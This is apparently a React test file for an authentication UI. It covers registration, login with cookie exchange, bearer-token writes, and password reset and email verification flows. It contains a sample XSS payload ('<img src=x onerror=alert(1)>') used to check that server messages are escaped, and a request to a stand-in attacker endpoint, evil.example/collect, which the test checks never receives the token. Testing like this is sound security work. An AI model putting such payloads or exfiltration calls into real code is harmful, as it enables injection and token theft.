import { act, render, screen, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { MemoryRouter, Route, Routes } from 'react-router';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { AuthProvider, ForgotPasswordPage, LoginPage, RegisterPage, ResetPasswordPage, VerificationPendingPage, VerifyEmailPage, useAuth } from './index';

const response = (ok: boolean, data: object, status = ok ? 200 : 400) => ({ ok, status, json: async () => data });
const fetchMock = vi.fn();
beforeEach(() => { fetchMock.mockReset(); vi.stubGlobal('fetch', fetchMock); });

function page(element: React.ReactNode, entry = '/') {
  return render(<MemoryRouter initialEntries={[entry]}><AuthProvider><Routes>
    <Route path="*" element={element} />
    <Route path="/auth/verification-pending" element={<VerificationPendingPage />} />
    <Route path="/auth/login" element={<LoginPage />} />
  </Routes></AuthProvider></MemoryRouter>);
}

function State() {
  const auth = useAuth();
  return <><span data-testid="identity">{auth.user?.email ?? 'signed out'}</span><span data-testid="token">{auth.token ?? 'none'}</span><button onClick={() => auth.refreshProfile()}>Refresh profile</button><button onClick={() => auth.logout()}>Log out</button></>;
}

function WriteProbe() {
  const { login, authenticatedFetch } = useAuth();
  return <><button onClick={() => login('e@example.com', 'secret123')}>Authenticate</button>
    <button onClick={() => authenticatedFetch('/api/notes', { method: 'POST', body: '{}' }).catch(() => {})}>Write note</button>
    <button onClick={() => authenticatedFetch('/api/notes', { method: 'GET' })}>Read notes</button>
    <button onClick={() => authenticatedFetch('https://evil.example/collect', { method: 'POST' }).catch(() => {})}>External write</button></>;
}

describe('pinned auth views', () => {
  it('defaults to the source disabled-registration alert without posting', async () => {
    page(<RegisterPage />, '/auth/register');
    expect(screen.getByRole('heading', { name: 'Registration Disabled' })).toBeVisible();
    expect(screen.getByText(/Registration is currently disabled. Please contact the administrator/)).toBeVisible();
    expect(screen.getByRole('link', { name: 'Return to Home' })).toHaveAttribute('href', '/');
    expect(screen.queryByRole('button', { name: 'Register' })).not.toBeInTheDocument();
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it('validates matching passwords locally and posts exactly the register DTO when enabled', async () => {
    fetchMock.mockResolvedValue(response(true, { email: 'normalized@example.com' }));
    page(<RegisterPage registrationEnabled />, '/auth/register');
    const user = userEvent.setup();
    await user.type(screen.getByLabelText('Username'), 'someone');
    await user.type(screen.getByLabelText('Email address'), 'original@example.com');
    await user.type(screen.getByLabelText('Password', { exact: true }), 'secret123');
    await user.type(screen.getByLabelText('Confirm Password'), 'different');
    await user.click(screen.getByRole('button', { name: 'Register' }));
    expect(screen.getByRole('alert')).toHaveTextContent('Passwords do not match');
    expect(fetchMock).not.toHaveBeenCalled();
    await user.clear(screen.getByLabelText('Confirm Password'));
    await user.type(screen.getByLabelText('Confirm Password'), 'secret123');
    await user.click(screen.getByRole('button', { name: 'Register' }));
    await waitFor(() => expect(fetchMock).toHaveBeenCalledWith('/api/auth/register', expect.objectContaining({ method: 'POST', body: JSON.stringify({ username: 'someone', email: 'original@example.com', password: 'secret123' }) })));
    expect(await screen.findByText(/normalized@example.com/)).toBeVisible();
  });

  it('shows server registration failure and verification-pending copy safely', async () => {
    fetchMock.mockResolvedValue(response(false, { message: '<img src=x onerror=alert(1)>' }, 403));
    const { container } = page(<RegisterPage registrationEnabled />, '/auth/register');
    const user = userEvent.setup();
    await user.type(screen.getByLabelText('Username'), 'someone');
    await user.type(screen.getByLabelText('Email address'), 'e@example.com');
    await user.type(screen.getByLabelText('Password', { exact: true }), 'secret123');
    await user.type(screen.getByLabelText('Confirm Password'), 'secret123');
    await user.click(screen.getByRole('button', { name: 'Register' }));
    expect(await screen.findByRole('alert')).toHaveTextContent('<img src=x onerror=alert(1)>');
    expect(container.querySelector('img')).toBeNull();
  });

  it('login displays verification marker, exchanges token for cookie, and keeps token in memory', async () => {
    fetchMock.mockResolvedValueOnce(response(true, { token: 'jwt-secret', email: 'e@example.com', userId: 'u1', roles: ['Admin'], expiresAt: '2027-01-01' }))
      .mockResolvedValueOnce(response(true, { success: true }));
    page(<><LoginPage /><State /></>, '/auth/login?verified=1');
    expect(screen.getByRole('alert')).toHaveTextContent('Email verified. You can log in now.');
    const user = userEvent.setup();
    await user.type(screen.getByLabelText('Email address'), 'e@example.com');
    await user.type(screen.getByLabelText('Password'), 'secret123');
    await user.click(screen.getByRole('button', { name: 'Sign In' }));
    await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(2));
    expect(fetchMock).toHaveBeenNthCalledWith(2, '/api/auth/cookie', expect.objectContaining({ method: 'POST', body: JSON.stringify({ token: 'jwt-secret' }) }));
    expect(screen.getByTestId('identity')).toHaveTextContent('e@example.com');
    expect(screen.getByTestId('token')).toHaveTextContent('jwt-secret');
    expect(localStorage.length).toBe(0);
  });

  it('does not establish a session when the cookie exchange fails', async () => {
    fetchMock.mockResolvedValueOnce(response(true, { token: 'jwt-secret', email: 'e@example.com', userId: 'u1', roles: [], expiresAt: '2027-01-01' }))
      .mockResolvedValueOnce(response(false, { message: 'No' }));
    page(<><LoginPage /><State /></>, '/auth/login');
    const user = userEvent.setup();
    await user.type(screen.getByLabelText('Email address'), 'e@example.com');
    await user.type(screen.getByLabelText('Password'), 'secret123');
    await user.click(screen.getByRole('button', { name: 'Sign In' }));
    expect(await screen.findByRole('alert')).toHaveTextContent('Login succeeded but cookie setup failed. Please try again.');
    expect(localStorage.length).toBe(0);
  });

  it('clears the password after a failed login rather than leaving a secret in the DOM', async () => {
    fetchMock.mockResolvedValue(response(false, { message: 'Rate limit exceeded.' }, 429));
    page(<LoginPage />, '/auth/login');
    const user = userEvent.setup();
    await user.type(screen.getByLabelText('Email address'), 'e@example.com');
    await user.type(screen.getByLabelText('Password'), 'secret123');
    await user.click(screen.getByRole('button', { name: 'Sign In' }));
    expect(await screen.findByRole('alert')).toHaveTextContent('Rate limit exceeded.');
    expect(screen.getByLabelText('Password')).toHaveValue('');
    expect(screen.getByLabelText('Email address')).toHaveValue('e@example.com');
  });

  it('does not let a stale anonymous profile response erase a newly established session', async () => {
    let finishProfile!: (value: ReturnType<typeof response>) => void;
    fetchMock.mockImplementation((url: string) => {
      if (url === '/api/auth/profile') return new Promise(resolve => { finishProfile = resolve; });
      if (url === '/api/auth/login') return Promise.resolve(response(true, { token: 'jwt-secret', email: 'e@example.com', userId: 'u1', roles: ['Admin'], expiresAt: '2027-01-01' }));
      return Promise.resolve(response(true, { success: true }));
    });
    render(<MemoryRouter initialEntries={['/auth/login']}><AuthProvider><LoginPage /><State /></AuthProvider></MemoryRouter>);
    const user = userEvent.setup();
    await user.click(screen.getByRole('button', { name: 'Refresh profile' }));
    await user.type(screen.getByLabelText('Email address'), 'e@example.com');
    await user.type(screen.getByLabelText('Password'), 'secret123');
    await user.click(screen.getByRole('button', { name: 'Sign In' }));
    await waitFor(() => expect(screen.getByTestId('identity')).toHaveTextContent('e@example.com'));
    await act(async () => finishProfile(response(false, {}, 401)));
    expect(screen.getByTestId('identity')).toHaveTextContent('e@example.com');
    expect(screen.getByTestId('token')).toHaveTextContent('jwt-secret');
  });

  it('uses a safe cookie-backed GET for profile and bearer token for writes', async () => {
    fetchMock.mockResolvedValueOnce(response(true, { email: 'cookie@example.com', userId: 'u2', roles: [], token: '', expiresAt: '1970-01-01' }))
      .mockResolvedValueOnce(response(true, { success: true }));
    page(<State />);
    const user = userEvent.setup();
    await user.click(screen.getByRole('button', { name: 'Refresh profile' }));
    await waitFor(() => expect(screen.getByTestId('identity')).toHaveTextContent('cookie@example.com'));
    expect(fetchMock).toHaveBeenNthCalledWith(1, '/api/auth/profile', expect.objectContaining({ method: 'GET', credentials: 'same-origin' }));
    await user.click(screen.getByRole('button', { name: 'Log out' }));
    await waitFor(() => expect(screen.getByTestId('identity')).toHaveTextContent('signed out'));
  });

  it('rejects cookie-only writes and uses bearer without cookies after login', async () => {
    fetchMock.mockResolvedValue(response(true, {}));
    fetchMock.mockResolvedValueOnce(response(true, { token: 'jwt-secret', email: 'e@example.com', userId: 'u1', roles: [], expiresAt: '2027-01-01' }));
    page(<WriteProbe />);
    const user = userEvent.setup();
    await user.click(screen.getByRole('button', { name: 'Write note' }));
    expect(fetchMock).not.toHaveBeenCalled();
    await user.click(screen.getByRole('button', { name: 'Authenticate' }));
    await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(2));
    await user.click(screen.getByRole('button', { name: 'Write note' }));
    await waitFor(() => expect(fetchMock).toHaveBeenCalledTimes(3));
    const [, write] = fetchMock.mock.calls[2] as [string, RequestInit];
    expect(write.credentials).toBe('omit');
    expect(new Headers(write.headers).get('Authorization')).toBe('Bearer jwt-secret');
    await user.click(screen.getByRole('button', { name: 'Read notes' }));
    expect(fetchMock).toHaveBeenLastCalledWith('/api/notes', expect.objectContaining({ credentials: 'same-origin', method: 'GET' }));
    await user.click(screen.getByRole('button', { name: 'External write' }));
    expect(fetchMock).toHaveBeenCalledTimes(4);
  });

  it('forgot-password shows a generic result and handles API failures', async () => {
    fetchMock.mockResolvedValueOnce(response(true, { message: 'If your email is registered, you will receive a password reset link shortly.' }));
    page(<ForgotPasswordPage />, '/auth/forgot-password');
    const user = userEvent.setup();
    await user.type(screen.getByLabelText('Email address'), 'e@example.com');
    await user.click(screen.getByRole('button', { name: 'Send reset link' }));
    expect(await screen.findByRole('alert')).toHaveTextContent('If your email is registered');
    expect(fetchMock).toHaveBeenCalledWith('/api/auth/forgot-password', expect.objectContaining({ method: 'POST', body: JSON.stringify({ email: 'e@example.com' }) }));
  });

  it('reset rejects missing token and mismatched passwords before posting', async () => {
    const user = userEvent.setup();
    const view = page(<ResetPasswordPage />, '/auth/reset-password');
    expect(screen.getByRole('alert')).toHaveTextContent('Invalid reset token.');
    view.unmount();
    page(<ResetPasswordPage />, '/auth/reset-password?token=one-time');
    await user.type(screen.getByLabelText('New password'), 'secret123');
    await user.type(screen.getByLabelText('Confirm password'), 'mismatch');
    await user.click(screen.getByRole('button', { name: 'Reset Password' }));
    expect(screen.getByRole('alert')).toHaveTextContent('Passwords do not match.');
    expect(fetchMock).not.toHaveBeenCalled();
    await user.clear(screen.getByLabelText('Confirm password'));
    await user.type(screen.getByLabelText('Confirm password'), 'secret123');
    fetchMock.mockResolvedValue(response(true, { message: 'Password reset successful.' }));
    await user.click(screen.getByRole('button', { name: 'Reset Password' }));
    expect(await screen.findByRole('alert')).toHaveTextContent('Password reset successful. Redirecting to login...');
    expect(fetchMock).toHaveBeenCalledWith('/api/auth/reset-password', expect.objectContaining({ method: 'POST', body: JSON.stringify({ token: 'one-time', newPassword: 'secret123' }) }));
  });

  it('verify-email sends a safe GET and follows the backend redirect marker', async () => {
    fetchMock.mockResolvedValue({ ok: true, redirected: true, url: new URL('/auth/login?verified=1', window.location.href).href });
    page(<VerifyEmailPage />, '/auth/verify-email?token=one%20time');
    expect(await screen.findByRole('alert')).toHaveTextContent('Email verified. You can log in now.');
    expect(fetchMock).toHaveBeenCalledWith('/api/auth/verify-email?token=one%20time', expect.objectContaining({ method: 'GET', credentials: 'same-origin' }));
  });
});
